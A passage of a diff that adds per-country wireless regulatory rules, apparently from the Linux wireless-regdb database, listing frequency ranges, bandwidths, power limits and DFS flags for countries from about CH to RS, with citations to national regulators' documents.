+	(2402 - 2482 @ 40), (20)
+	(5170 - 5250 @ 80), (20), AUTO-BW
+	(5250 - 5330 @ 80), (20), DFS, AUTO-BW
+	(5490 - 5710 @ 160), (27), DFS
+	# 60 gHz band channels 1-4, ref: Etsi En 302 567
+	(57000 - 66000 @ 2160), (40)
+
+country CI: DFS-FCC
+	(2402 - 2482 @ 40), (20)
+	(5170 - 5250 @ 80), (17), AUTO-BW
+	(5250 - 5330 @ 80), (24), DFS, AUTO-BW
+	(5490 - 5730 @ 160), (24), DFS
+	(5735 - 5835 @ 80), (30)
+
+country CL: DFS-JP
+	(2402 - 2482 @ 40), (20)
+	(5170 - 5250 @ 80), (20), AUTO-BW
+	(5250 - 5330 @ 80), (20), DFS, AUTO-BW
+	(5735 - 5835 @ 80), (20)
+
+country CN: DFS-FCC
+	(2402 - 2482 @ 40), (20)
+	(5170 - 5250 @ 80), (23), AUTO-BW
+	(5250 - 5330 @ 80), (23), DFS, AUTO-BW
+	(5735 - 5835 @ 80), (30)
+	# 60 gHz band channels 1,4: 28dBm, channels 2,3: 44dBm
+	# ref: http://www.miit.gov.cn/n11293472/n11505629/n11506593/n11960250/n11960606/n11960700/n12330791.files/n12330790.pdf
+	(57240 - 59400 @ 2160), (28)
+	(59400 - 63720 @ 2160), (44)
+	(63720 - 65880 @ 2160), (28)
+
+country CO: DFS-FCC
+	(2402 - 2482 @ 40), (20)
+	(5170 - 5250 @ 80), (17), AUTO-BW
+	(5250 - 5330 @ 80), (24), DFS, AUTO-BW
+	(5490 - 5730 @ 160), (24), DFS
+	(5735 - 5835 @ 80), (30)
+
+country CR: DFS-FCC
+	(2402 - 2482 @ 40), (20)
+	(5170 - 5250 @ 80), (17)
+	(5250 - 5330 @ 80), (24), DFS
+	(5490 - 5730 @ 80), (24), DFS
+	(5735 - 5835 @ 80), (30)
+
+country CX: DFS-FCC
+	(2402 - 2482 @ 40), (20)
+	(5170 - 5250 @ 80), (24), AUTO-BW
+	(5250 - 5330 @ 80), (24), DFS, AUTO-BW
+	(5490 - 5730 @ 160), (24), DFS
+	(5735 - 5835 @ 80), (30)
+
+country CY: DFS-ETSI
+	(2402 - 2482 @ 40), (20)
+	(5170 - 5250 @ 80), (20), AUTO-BW
+	(5250 - 5330 @ 80), (20), DFS, AUTO-BW
+	(5490 - 5710 @ 160), (27), DFS
+	# 60 gHz band channels 1-4, ref: Etsi En 302 567
+	(57000 - 66000 @ 2160), (40)
+
+# Data from http://www.ctu.eu/164/download/VOR/VOR-12-08-2005-34.pdf
+# and http://www.ctu.eu/164/download/VOR/VOR-12-05-2007-6-AN.pdf
+# Power at 5250 - 5350 MHz and 5470 - 5725 MHz can be doubled if TPC is
+# implemented.
+country CZ: DFS-ETSI
+	(2400 - 2483.5 @ 40), (100 mW)
+	(5150 - 5250 @ 80), (200 mW), NO-OUTDOOR, AUTO-BW
+	(5250 - 5350 @ 80), (100 mW), NO-OUTDOOR, DFS, AUTO-BW
+	(5470 - 5725 @ 160), (500 mW), DFS
+	# 60 gHz band channels 1-4, ref: Etsi En 302 567
+	(57000 - 66000 @ 2160), (40)
+
+# Data from "Frequenznutzungsplan" (as published in April 2008), downloaded from
+# http://www.bundesnetzagentur.de/cae/servlet/contentblob/38448/publicationFile/2659/Frequenznutzungsplan2008_Id17448pdf.pdf
+# For the 5GHz range also see
+# http://www.bundesnetzagentur.de/cae/servlet/contentblob/38216/publicationFile/6579/WLAN5GHzVfg7_2010_28042010pdf.pdf
+# The values have been reduced by a factor of 2 (3db) for non TPC devices
+# (in other words: devices with TPC can use twice the tx power of this table).
+# Note that the docs do not require TPC for 5150--5250; the reduction to
+# 100mW thus is not strictly required -- however the conservative 100mW
+# limit is used here as the non-interference with radar and satellite
+# apps relies on the attenuation by the building walls only in the
+# absence of DFS; the neighbour countries have 100mW limit here as well.
+
+country DE: DFS-ETSI
+	# entries 279004 and 280006
+	(2400 - 2483.5 @ 40), (100 mW)
+	# entry 303005
+	(5150 - 5250 @ 80), (100 mW), NO-OUTDOOR, AUTO-BW
+	# entries 304002 and 305002
+	(5250 - 5350 @ 80), (100 mW), NO-OUTDOOR, DFS, AUTO-BW
+	# entries 308002, 309001 and 310003
+	(5470 - 5725 @ 160), (500 mW), DFS
+	# 60 gHz band channels 1-4, ref: Etsi En 302 567
+	(57000 - 66000 @ 2160), (40)
+
+country DK: DFS-ETSI
+	(2402 - 2482 @ 40), (20)
+	(5170 - 5250 @ 80), (20), AUTO-BW
+	(5250 - 5330 @ 80), (20), DFS, AUTO-BW
+	(5490 - 5710 @ 160), (27), DFS
+	# 60 gHz band channels 1-4, ref: Etsi En 302 567
+	(57000 - 66000 @ 2160), (40)
+
+# Source:
+# http://www.ntrcdom.org/index.php?option=com_content&view=category&layout=blog&id=10&Itemid=55
+country DM: DFS-FCC
+	(2402 - 2472 @ 40), (30)
+	(5170 - 5250 @ 80), (17), AUTO-BW
+	(5250 - 5330 @ 80), (23), DFS, AUTO-BW
+	(5735 - 5835 @ 80), (30)
+
+country DO: DFS-FCC
+	(2402 - 2472 @ 40), (30)
+	(5170 - 5250 @ 80), (17), AUTO-BW
+	(5250 - 5330 @ 80), (23), DFS, AUTO-BW
+	(5735 - 5835 @ 80), (30)
+
+country DZ: DFS-JP
+	(2402 - 2482 @ 40), (20)
+	(5170.000 - 5250.000 @ 80.000), (23.00), AUTO-BW
+	(5250.000 - 5330.000 @ 80.000), (23.00), DFS, AUTO-BW
+	(5490.000 - 5670.000 @ 160.000), (23.00), DFS
+
+country EC: DFS-FCC
+	(2402 - 2482 @ 40), (20)
+	(5170 - 5250 @ 80), (17)
+	(5250 - 5330 @ 80), (24), DFS
+	(5490 - 5730 @ 80), (24), DFS
+	(5735 - 5835 @ 80), (30)
+
+country EE: DFS-ETSI
+	(2402 - 2482 @ 40), (20)
+	(5170 - 5250 @ 80), (20), AUTO-BW
+	(5250 - 5330 @ 80), (20), DFS, AUTO-BW
+	(5490 - 5710 @ 160), (27), DFS
+	# 60 gHz band channels 1-4, ref: Etsi En 302 567
+	(57000 - 66000 @ 2160), (40)
+
+country EG: DFS-ETSI
+	(2402 - 2482 @ 40), (20)
+	(5170 - 5250 @ 80), (20)
+	(5250 - 5330 @ 80), (20), DFS
+
+# Orden IET/787/2013, de 25 de abril, por la que se aprueba
+# el cuadro nacional de atribución de frecuencias.
+# http://www.boe.es/diario_boe/txt.php?id=BOE-A-2013-4845
+#
+# more info at "Cuadro nacional de atribución de frecuencias (CNAF)":
+# http://www.minetur.gob.es/telecomunicaciones/espectro/paginas/cnaf.aspx
+
+country ES: DFS-ETSI
+	(2400 - 2483.5 @ 40), (100 mW)
+	(5150 - 5250 @ 80), (200 mW), NO-OUTDOOR, AUTO-BW
+	(5250 - 5350 @ 80), (100 mW), NO-OUTDOOR, DFS, AUTO-BW
+	(5470 - 5725 @ 160), (500 mW), DFS
+	# 60 gHz band channels 1-4, ref: Etsi En 302 567
+	(57000 - 66000 @ 2160), (40)
+
+country ET: DFS-ETSI
+	(2402 - 2482 @ 40), (20)
+	(5170 - 5250 @ 80), (20), AUTO-BW
+	(5250 - 5330 @ 80), (20), DFS, AUTO-BW
+	(5490 - 5710 @ 160), (27), DFS
+
+country FI: DFS-ETSI
+	(2402 - 2482 @ 40), (20)
+	(5170 - 5250 @ 80), (20), AUTO-BW
+	(5250 - 5330 @ 80), (20), DFS, AUTO-BW
+	(5490 - 5710 @ 160), (27), DFS
+	# 60 gHz band channels 1-4, ref: Etsi En 302 567
+	(57000 - 66000 @ 2160), (40)
+
+country FM: DFS-FCC
+	(2402 - 2472 @ 40), (30)
+	(5170 - 5250 @ 80), (24), AUTO-BW
+	(5250 - 5330 @ 80), (24), DFS, AUTO-BW
+	(5490 - 5730 @ 160), (24), DFS
+	(5735 - 5835 @ 80), (30)
+
+country FR: DFS-ETSI
+	(2402 - 2482 @ 40), (20)
+	(5170 - 5250 @ 80), (20), AUTO-BW
+	(5250 - 5330 @ 80), (20), DFS, AUTO-BW
+	(5490 - 5710 @ 160), (27), DFS
+	# 60 gHz band channels 1-4, ref: Etsi En 302 567
+	(57000 - 66000 @ 2160), (40)
+
+country GB: DFS-ETSI
+	(2402 - 2482 @ 40), (20)
+	(5170 - 5250 @ 80), (20), AUTO-BW
+	(5250 - 5330 @ 80), (20), DFS, AUTO-BW
+	(5490 - 5710 @ 160), (27), DFS
+	# 60 gHz band channels 1-4, ref: Etsi En 302 567
+	(57000 - 66000 @ 2160), (40)
+
+country GD: DFS-FCC
+	(2402 - 2472 @ 40), (30)
+	(5170 - 5250 @ 80), (17), AUTO-BW
+	(5250 - 5330 @ 80), (24), DFS, AUTO-BW
+	(5490 - 5730 @ 160), (24), DFS
+	(5735 - 5835 @ 80), (30)
+
+country GE: DFS-ETSI
+	(2402 - 2482 @ 40), (20)
+	(5170 - 5250 @ 80), (18), AUTO-BW
+	(5250 - 5330 @ 80), (18), DFS, AUTO-BW
+	# 60 gHz band channels 1-4, ref: Etsi En 302 567
+	(57000 - 66000 @ 2160), (40)
+
+country GF: DFS-ETSI
+	(2402 - 2482 @ 40), (20)
+	(5170 - 5250 @ 80), (20), AUTO-BW
+	(5250 - 5330 @ 80), (20), DFS, AUTO-BW
+	(5490 - 5710 @ 160), (27), DFS
+
+country GH: DFS-FCC
+	(2402 - 2482 @ 40), (20)
+	(5170 - 5250 @ 80), (17), AUTO-BW
+	(5250 - 5330 @ 80), (24), DFS, AUTO-BW
+	(5490 - 5730 @ 160), (24), DFS
+	(5735 - 5835 @ 80), (30)
+
+country GL: DFS-ETSI
+	(2402 - 2482 @ 40), (20)
+	(5170 - 5250 @ 80), (20)
+	(5250 - 5330 @ 80), (20), DFS
+	(5490 - 5710 @ 80), (27), DFS
+
+country GP: DFS-ETSI
+	(2402 - 2482 @ 40), (20)
+	(5170 - 5250 @ 80), (20), AUTO-BW
+	(5250 - 5330 @ 80), (20), DFS, AUTO-BW
+	(5490 - 5710 @ 160), (27), DFS
+
+country GR: DFS-ETSI
+	(2402 - 2482 @ 40), (20)
+	(5170 - 5250 @ 80), (20), AUTO-BW
+	(5250 - 5330 @ 80), (20), DFS, AUTO-BW
+	(5490 - 5710 @ 160), (27), DFS
+	# 60 gHz band channels 1-4, ref: Etsi En 302 567
+	(57000 - 66000 @ 2160), (40)
+
+country GT: DFS-FCC
+	(2402 - 2472 @ 40), (30)
+	(5170 - 5250 @ 80), (17), AUTO-BW
+	(5250 - 5330 @ 80), (23), DFS, AUTO-BW
+	(5735 - 5835 @ 80), (30)
+
+country GU: DFS-FCC
+	(2402 - 2472 @ 40), (30)
+	(5170 - 5250 @ 80), (17)
+	(5250 - 5330 @ 80), (24), DFS
+	(5490 - 5730 @ 80), (24), DFS
+	(5735 - 5835 @ 80), (30)
+
+country GY:
+	(2402 - 2482 @ 40), (30)
+	(5735 - 5835 @ 80), (30)
+
+country HK:
+	(2402 - 2482 @ 40), (20)
+	(5170 - 5250 @ 80), (17), AUTO-BW
+	(5250 - 5330 @ 80), (24), DFS, AUTO-BW
+	(5490 - 5710 @ 160), (24), DFS
+	(5735 - 5835 @ 80), (30)
+
+country HN: DFS-FCC
+	(2402 - 2482 @ 40), (20)
+	(5170 - 5250 @ 80), (17), AUTO-BW
+	(5250 - 5330 @ 80), (24), DFS, AUTO-BW
+	(5490 - 5730 @ 160), (24), DFS
+	(5735 - 5835 @ 80), (30)
+
+country HR: DFS-ETSI
+	(2402 - 2482 @ 40), (20)
+	(5170 - 5250 @ 80), (20), AUTO-BW
+	(5250 - 5330 @ 80), (20), DFS, AUTO-BW
+	(5490 - 5710 @ 160), (27), DFS
+	# 60 gHz band channels 1-4, ref: Etsi En 302 567
+	(57000 - 66000 @ 2160), (40)
+
+country HT: DFS-FCC
+	(2402 - 2472 @ 40), (30)
+	(5170 - 5250 @ 80), (24), AUTO-BW
+	(5250 - 5330 @ 80), (24), DFS, AUTO-BW
+	(5490 - 5730 @ 160), (24), DFS
+	(5735 - 5835 @ 80), (30)
+
+country HU: DFS-ETSI
+	(2402 - 2482 @ 40), (20)
+	(5170 - 5250 @ 80), (20), AUTO-BW
+	(5250 - 5330 @ 80), (20), DFS, AUTO-BW
+	(5490 - 5710 @ 160), (27), DFS
+	# 60 gHz band channels 1-4, ref: Etsi En 302 567
+	(57000 - 66000 @ 2160), (40)
+
+country ID: DFS-JP
+	# ref: http://www.postel.go.id/content/ID/regulasi/standardisasi/kepdir/bwa%205,8%20ghz.pdf
+	(2402 - 2482 @ 40), (20)
+	(5735 - 5815 @ 80), (23)
+
+country IE: DFS-ETSI
+	(2402 - 2482 @ 40), (20)
+	(5170 - 5250 @ 80), (20), AUTO-BW
+	(5250 - 5330 @ 80), (20), DFS, AUTO-BW
+	(5490 - 5710 @ 160), (27), DFS
+	# 60 gHz band channels 1-4, ref: Etsi En 302 567
+	(57000 - 66000 @ 2160), (40)
+
+country IL: DFS-ETSI
+	(2402 - 2482 @ 40), (20)
+	(5150 - 5250 @ 80), (200 mW), NO-OUTDOOR, AUTO-BW
+	(5250 - 5350 @ 80), (200 mW), NO-OUTDOOR, DFS, AUTO-BW
+
+country IN: DFS-JP
+	(2402 - 2482 @ 40), (20)
+	(5170 - 5250 @ 80), (20), AUTO-BW
+	(5250 - 5330 @ 80), (20), DFS, AUTO-BW
+	(5735 - 5835 @ 80), (20)
+
+country IR: DFS-JP
+	(2402 - 2482 @ 40), (20)
+	(5735 - 5835 @ 80), (30)
+
+country IS: DFS-ETSI
+	(2402 - 2482 @ 40), (20)
+	(5170 - 5250 @ 80), (20), AUTO-BW
+	(5250 - 5330 @ 80), (20), DFS, AUTO-BW
+	(5490 - 5710 @ 160), (27), DFS
+	# 60 gHz band channels 1-4, ref: Etsi En 302 567
+	(57000 - 66000 @ 2160), (40)
+
+country IT: DFS-ETSI
+	(2402 - 2482 @ 40), (20)
+	(5170 - 5250 @ 80), (20), AUTO-BW
+	(5250 - 5330 @ 80), (20), DFS, AUTO-BW
+	(5490 - 5710 @ 160), (27), DFS
+	# 60 gHz band channels 1-4, ref: Etsi En 302 567
+	(57000 - 66000 @ 2160), (40)
+
+country JM: DFS-FCC
+	(2402 - 2482 @ 40), (20)
+	(5170 - 5250 @ 80), (17), AUTO-BW
+	(5250 - 5330 @ 80), (24), DFS, AUTO-BW
+	(5490 - 5730 @ 160), (24), DFS
+	(5735 - 5835 @ 80), (30)
+
+country JO: DFS-JP
+	(2402 - 2482 @ 40), (20)
+	(5170 - 5250 @ 80), (23)
+	(5735 - 5835 @ 80), (23)
+
+country JP: DFS-JP
+	(2402 - 2482 @ 40), (20)
+	(2474 - 2494 @ 20), (20), NO-OFDM
+	(4910 - 4990 @ 40), (23)
+	(5030 - 5090 @ 40), (23)
+	(5170 - 5250 @ 80), (20), AUTO-BW
+	(5250 - 5330 @ 80), (20), DFS, AUTO-BW
+	(5490 - 5710 @ 160), (23), DFS
+
+country KE: DFS-JP
+	(2402 - 2482 @ 40), (20)
+	(5170 - 5250 @ 80), (23)
+	(5490 - 5570 @ 80), (30), DFS
+	(5735 - 5775 @ 40), (23)
+
+country KH: DFS-ETSI
+	(2402 - 2482 @ 40), (20)
+	(5170 - 5250 @ 80), (20), AUTO-BW
+	(5250 - 5330 @ 80), (20), DFS, AUTO-BW
+	(5490 - 5710 @ 160), (27), DFS
+
+# Source
+# http://ntrc.kn/?page_id=7
+country KN: DFS-ETSI
+	(2402 - 2482 @ 40), (20)
+	(5170 - 5250 @ 80), (20), AUTO-BW
+	(5250 - 5330 @ 80), (20), DFS, AUTO-BW
+	(5490 - 5710 @ 160), (30), DFS
+	(5735 - 5815 @ 80), (30)
+
+country KP: DFS-JP
+	(2402 - 2482 @ 40), (20)
+	(5170 - 5250 @ 80), (20), AUTO-BW
+	(5250 - 5330 @ 80), (20), DFS, AUTO-BW
+	(5490 - 5630 @ 80), (30), DFS
+	(5735 - 5815 @ 80), (30)
+
+country KR: DFS-JP
+	(2402 - 2482 @ 40), (20)
+	(5170 - 5250 @ 80), (20), AUTO-BW
+	(5250 - 5330 @ 80), (20), DFS, AUTO-BW
+	(5490 - 5710 @ 160), (30), DFS
+	(5735 - 5835 @ 80), (30)
+
+country KW: DFS-ETSI
+	(2402 - 2482 @ 40), (20)
+	(5170 - 5250 @ 80), (20), AUTO-BW
+	(5250 - 5330 @ 80), (20), DFS, AUTO-BW
+
+country KY: DFS-FCC
+	(2402 - 2482 @ 40), (20)
+	(5170 - 5250 @ 80), (24), AUTO-BW
+	(5250 - 5330 @ 80), (24), DFS, AUTO-BW
+	(5490 - 5730 @ 160), (24), DFS
+	(5735 - 5835 @ 80), (30)
+
+country KZ:
+	(2402 - 2482 @ 40), (20)
+
+country LB: DFS-FCC
+	(2402 - 2482 @ 40), (20)
+	(5170 - 5250 @ 80), (17), AUTO-BW
+	(5250 - 5330 @ 80), (24), DFS, AUTO-BW
+	(5490 - 5730 @ 160), (24), DFS
+	(5735 - 5835 @ 80), (30)
+
+# Source:
+# http://www.ntrc.org.lc/operational_structures.htm
+country LC: DFS-ETSI
+	(2402 - 2482 @ 40), (20)
+	(5170 - 5250 @ 80), (20), AUTO-BW
+	(5250 - 5330 @ 80), (20), DFS, AUTO-BW
+	(5490 - 5710 @ 160), (30), DFS
+	(5735 - 5815 @ 80), (30)
+
+country LI: DFS-ETSI
+	(2402 - 2482 @ 40), (20)
+	(5170 - 5250 @ 80), (20), AUTO-BW
+	(5250 - 5330 @ 80), (20), DFS, AUTO-BW
+	(5490 - 5710 @ 160), (27), DFS
+
+country LK: DFS-FCC
+	(2402 - 2482 @ 40), (20)
+	(5170 - 5250 @ 80), (17)
+	(5250 - 5330 @ 80), (24), DFS
+	(5490 - 5730 @ 80), (24), DFS
+	(5735 - 5835 @ 80), (30)
+
+# Source:
+# http://lca.org.ls/images/documents/lesotho_national_frequency_allocation_plan.pdf
+country LS: DFS-ETSI
+	(2402 - 2482 @ 40), (20)
+	(5170 - 5250 @ 80), (20), AUTO-BW
+	(5250 - 5330 @ 80), (20), DFS, AUTO-BW
+	(5490 - 5710 @ 160), (27), DFS
+
+country LT: DFS-ETSI
+	(2402 - 2482 @ 40), (20)
+	(5170 - 5250 @ 80), (20), AUTO-BW
+	(5250 - 5330 @ 80), (20), DFS, AUTO-BW
+	(5490 - 5710 @ 160), (27), DFS
+	# 60 gHz band channels 1-4, ref: Etsi En 302 567
+	(57000 - 66000 @ 2160), (40)
+
+country LU: DFS-ETSI
+	(2402 - 2482 @ 40), (20)
+	(5170 - 5250 @ 80), (20), AUTO-BW
+	(5250 - 5330 @ 80), (20), DFS, AUTO-BW
+	(5490 - 5710 @ 160), (27), DFS
+	# 60 gHz band channels 1-4, ref: Etsi En 302 567
+	(57000 - 66000 @ 2160), (40)
+
+country LV: DFS-ETSI
+	(2402 - 2482 @ 40), (20)
+	(5170 - 5250 @ 80), (20), AUTO-BW
+	(5250 - 5330 @ 80), (20), DFS, AUTO-BW
+	(5490 - 5710 @ 160), (27), DFS
+	# 60 gHz band channels 1-4, ref: Etsi En 302 567
+	(57000 - 66000 @ 2160), (40)
+
+country MA: DFS-ETSI
+	(2402 - 2482 @ 40), (20)
+	(5170 - 5250 @ 80), (20), AUTO-BW
+	(5250 - 5330 @ 80), (20), DFS, AUTO-BW
+
+country MC: DFS-ETSI
+	(2402 - 2482 @ 40), (20)
+	(5170 - 5250 @ 80), (20), AUTO-BW
+	(5250 - 5330 @ 80), (20), DFS, AUTO-BW
+	(5490 - 5710 @ 160), (27), DFS
+
+# Source:
+# http://www.cnfr.md/index.php?pag=sec&id=117&l=en
+country MD: DFS-ETSI
+	(2402 - 2482 @ 40), (20)
+	(5170 - 5250 @ 80), (20), AUTO-BW
+	(5250 - 5330 @ 80), (20), DFS, AUTO-BW
+	(5490 - 5710 @ 160), (27), DFS
+
+# Source:
+# http://www.cept.org/files/1050/Tools%20and%20Services/EFIS%20-%20ECO%20Frequency%20Information%20System/National%20frequency%20tables/Montenegro%20NAFT%20-%202010.pdf
+country ME: DFS-ETSI
+	(2402 - 2482 @ 40), (20)
+	(5170 - 5250 @ 80), (20), AUTO-BW
+	(5250 - 5330 @ 80), (20), DFS, AUTO-BW
+	(5490 - 5710 @ 160), (27), DFS
+
+country MF: DFS-ETSI
+	(2402 - 2482 @ 40), (20)
+	(5170 - 5250 @ 80), (20), AUTO-BW
+	(5250 - 5330 @ 80), (20), DFS, AUTO-BW
+	(5490 - 5710 @ 160), (27), DFS
+
+country MH: DFS-FCC
+	(2402 - 2472 @ 40), (30)
+	(5170 - 5250 @ 80), (24), AUTO-BW
+	(5250 - 5330 @ 80), (24), DFS, AUTO-BW
+	(5490 - 5730 @ 160), (24), DFS
+	(5735 - 5835 @ 80), (30)
+
+country MK: DFS-ETSI
+	(2402 - 2482 @ 40), (20)
+	(5170 - 5250 @ 80), (20), AUTO-BW
+	(5250 - 5330 @ 80), (20), DFS, AUTO-BW
+	(5490 - 5710 @ 160), (27), DFS
+	# 60 gHz band channels 1-4, ref: Etsi En 302 567
+	(57000 - 66000 @ 2160), (40)
+
+country MN: DFS-FCC
+	(2402 - 2482 @ 40), (20)
+	(5170 - 5250 @ 80), (24), AUTO-BW
+	(5250 - 5330 @ 80), (24), DFS, AUTO-BW
+	(5490 - 5730 @ 160), (24), DFS
+	(5735 - 5835 @ 80), (30)
+
+country MO:
+	(2402 - 2482 @ 40), (20)
+	(5170 - 5250 @ 40), (23)
+	(5250 - 5330 @ 40), (23), DFS
+	(5735 - 5835 @ 40), (30)
+
+country MP: DFS-FCC
+	(2402 - 2472 @ 40), (30)
+	(5170 - 5250 @ 80), (24), AUTO-BW
+	(5250 - 5330 @ 80), (24), DFS, AUTO-BW
+	(5490 - 5730 @ 160), (24), DFS
+	(5735 - 5835 @ 80), (30)
+
+country MQ: DFS-ETSI
+	(2402 - 2482 @ 40), (20)
+	(5170 - 5250 @ 80), (20), AUTO-BW
+	(5250 - 5330 @ 80), (20), DFS, AUTO-BW
+	(5490 - 5710 @ 160), (27), DFS
+
+# Source:
+# http://www.are.mr/pdfs/telec_freq_TNAbf_2010.pdf
+country MR: DFS-ETSI
+	(2402 - 2482 @ 40), (20)
+	(5170 - 5250 @ 80), (20), AUTO-BW
+	(5250 - 5330 @ 80), (20), DFS, AUTO-BW
+	(5490 - 5710 @ 160), (27), DFS
+
+country MT: DFS-ETSI
+	(2402 - 2482 @ 40), (20)
+	(5170 - 5250 @ 80), (20), AUTO-BW
+	(5250 - 5330 @ 80), (20), DFS, AUTO-BW
+	(5490 - 5710 @ 160), (27), DFS
+	# 60 gHz band channels 1-4, ref: Etsi En 302 567
+	(57000 - 66000 @ 2160), (40)
+
+country MU: DFS-FCC
+	(2402 - 2482 @ 40), (20)
+	(5170 - 5250 @ 80), (24), AUTO-BW
+	(5250 - 5330 @ 80), (24), DFS, AUTO-BW
+	(5490 - 5730 @ 160), (24), DFS
+	(5735 - 5835 @ 80), (30)
+
+country MW: DFS-ETSI
+	(2402 - 2482 @ 40), (20)
+	(5170 - 5250 @ 80), (20), AUTO-BW
+	(5250 - 5330 @ 80), (20), DFS, AUTO-BW
+	(5490 - 5710 @ 160), (27), DFS
+
+country MX: DFS-FCC
+	(2402 - 2482 @ 40), (20)
+	(5170 - 5250 @ 80), (17), AUTO-BW
+	(5250 - 5330 @ 80), (24), DFS, AUTO-BW
+	(5490 - 5730 @ 160), (24), DFS
+	(5735 - 5835 @ 80), (30)
+
+country MY: DFS-FCC
+	(2402 - 2482 @ 40), (20)
+	(5170 - 5250 @ 80), (17), AUTO-BW
+	(5250 - 5330 @ 80), (23), DFS, AUTO-BW
+	(5735 - 5835 @ 80), (30)
+
+country NI: DFS-FCC
+	(2402 - 2472 @ 40), (30)
+	(5170 - 5250 @ 80), (24), AUTO-BW
+	(5250 - 5330 @ 80), (24), DFS, AUTO-BW
+	(5490 - 5730 @ 160), (24), DFS
+	(5735 - 5835 @ 80), (30)
+
+country NL: DFS-ETSI
+	(2402 - 2482 @ 40), (20)
+	(5170 - 5250 @ 80), (20), NO-OUTDOOR, AUTO-BW
+	(5250 - 5330 @ 80), (20), NO-OUTDOOR, DFS, AUTO-BW
+	(5490 - 5710 @ 160), (27), DFS
+	# 60 gHz band channels 1-4, ref: Etsi En 302 567
+	(57000 - 66000 @ 2160), (40)
+
+# Data from http://www.lovdata.no/dokument/SF/forskrift/2012-01-19-77
+# Power at 5250 - 5350 MHz, 5470 - 5725 MHz and 5815 – 5850 MHz can
+# be doubled if TPC is implemented.
+# Up to 2W (or 4W with TPC) is allowed in the 5725 – 5795 MHz band
+# which has been merged with 5470 - 5725 MHz to allow wide channels
+country NO: DFS-ETSI
+	(2400 - 2483.5 @ 40), (100 mW)
+	(5150 - 5250 @ 80), (200 mW), AUTO-BW
+	(5250 - 5350 @ 80), (100 mW), DFS, AUTO-BW
+	(5470 - 5795 @ 160), (500 mW), DFS
+	(5815 - 5850 @ 35), (2000 mW), DFS
+	(17100 - 17300 @ 200), (100 mW)
+	# 60 gHz band channels 1-4, ref: Etsi En 302 567
+	(57000 - 66000 @ 2160), (40)
+
+country NP: DFS-JP
+	(2402 - 2482 @ 40), (20)
+	(5170 - 5250 @ 80), (20), AUTO-BW
+	(5250 - 5330 @ 80), (20), DFS, AUTO-BW
+	(5735 - 5835 @ 80), (20)
+
+country NZ: DFS-FCC
+	(2402 - 2482 @ 40), (30)
+	(5170 - 5250 @ 80), (17), AUTO-BW
+	(5250 - 5330 @ 80), (24), DFS, AUTO-BW
+	(5490 - 5730 @ 160), (24), DFS
+	(5735 - 5835 @ 80), (30)
+
+country OM: DFS-ETSI
+	(2402 - 2482 @ 40), (20)
+	(5170 - 5250 @ 80), (20), AUTO-BW
+	(5250 - 5330 @ 80), (20), DFS, AUTO-BW
+	(5490 - 5710 @ 160), (27), DFS
+
+country PA: DFS-FCC
+	(2402 - 2472 @ 40), (30)
+	(5170 - 5250 @ 80), (17), AUTO-BW
+	(5250 - 5330 @ 80), (23), DFS, AUTO-BW
+	(5735 - 5835 @ 80), (30)
+
+country PE: DFS-FCC
+	(2402 - 2482 @ 40), (20)
+	(5170 - 5250 @ 80), (17), AUTO-BW
+	(5250 - 5330 @ 80), (24), DFS, AUTO-BW
+	(5490 - 5730 @ 160), (24), DFS
+	(5735 - 5835 @ 80), (30)
+
+country PF: DFS-ETSI
+	(2402 - 2482 @ 40), (20)
+	(5170 - 5250 @ 80), (20), AUTO-BW
+	(5250 - 5330 @ 80), (20), DFS, AUTO-BW
+	(5490 - 5710 @ 160), (27), DFS
+
+country PG: DFS-FCC
+	(2402 - 2482 @ 40), (20)
+	(5170 - 5250 @ 80), (17), AUTO-BW
+	(5250 - 5330 @ 80), (24), DFS, AUTO-BW
+	(5490 - 5730 @ 160), (24), DFS
+	(5735 - 5835 @ 80), (30)
+
+country PH: DFS-FCC
+	(2402 - 2482 @ 40), (20)
+	(5170 - 5250 @ 80), (17), AUTO-BW
+	(5250 - 5330 @ 80), (24), DFS, AUTO-BW
+	(5490 - 5730 @ 160), (24), DFS
+	(5735 - 5835 @ 80), (30)
+
+country PK: DFS-JP
+	(2402 - 2482 @ 40), (20)
+	(5735 - 5835 @ 80), (30)
+
+country PL: DFS-ETSI
+	(2402 - 2482 @ 40), (20)
+	(5170 - 5250 @ 80), (20), AUTO-BW
+	(5250 - 5330 @ 80), (20), DFS, AUTO-BW
+	(5490 - 5710 @ 160), (27), DFS
+	# 60 gHz band channels 1-4, ref: Etsi En 302 567
+	(57000 - 66000 @ 2160), (40)
+
+country PM: DFS-ETSI
+	(2402 - 2482 @ 40), (20)
+	(5170 - 5250 @ 80), (20), AUTO-BW
+	(5250 - 5330 @ 80), (20), DFS, AUTO-BW
+	(5490 - 5710 @ 160), (27), DFS
+
+country PR: DFS-FCC
+	(2402 - 2472 @ 40), (30)
+	(5170 - 5250 @ 80), (17), AUTO-BW
+	(5250 - 5330 @ 80), (24), DFS, AUTO-BW
+	(5490 - 5730 @ 160), (24), DFS
+	(5735 - 5835 @ 80), (30)
+
+country PT: DFS-ETSI
+	(2402 - 2482 @ 40), (20)
+	(5170 - 5250 @ 80), (20), AUTO-BW
+	(5250 - 5330 @ 80), (20), DFS, AUTO-BW
+	(5490 - 5710 @ 160), (27), DFS
+	# 60 gHz band channels 1-4, ref: Etsi En 302 567
+	(57000 - 66000 @ 2160), (40)
+
+country PW: DFS-FCC
+	(2402 - 2472 @ 40), (30)
+	(5170 - 5250 @ 80), (24), AUTO-BW
+	(5250 - 5330 @ 80), (24), DFS, AUTO-BW
+	(5490 - 5730 @ 160), (24), DFS
+	(5735 - 5835 @ 80), (30)
+
+country PY: DFS-FCC
+	(2402 - 2482 @ 40), (20)
+	(5170 - 5250 @ 80), (24), AUTO-BW
+	(5250 - 5330 @ 80), (24), DFS, AUTO-BW
+	(5490 - 5730 @ 160), (24), DFS
+	(5735 - 5835 @ 80), (30)
+
+country QA: DFS-JP
+	(2402 - 2482 @ 40), (20)
+	(5735 - 5835 @ 80), (30)
+
+country RE: DFS-ETSI
+	(2402 - 2482 @ 40), (20)
+	(5170 - 5250 @ 80), (20), AUTO-BW
+	(5250 - 5330 @ 80), (20), DFS, AUTO-BW
+	(5490 - 5710 @ 160), (27), DFS
+
+country RO: DFS-ETSI
+	(2402 - 2482 @ 40), (20)
+	(5170 - 5250 @ 80), (20), AUTO-BW
+	(5250 - 5330 @ 80), (20), DFS, AUTO-BW
+	(5490 - 5710 @ 160), (27), DFS
+	# 60 gHz band channels 1-4, ref: Etsi En 302 567
+	(57000 - 66000 @ 2160), (40)
+
+
+# Source:
+# http://www.ratel.rs/upload/documents/Plan_namene/Plan_namene-sl_glasnik.pdf
+country RS: DFS-ETSI
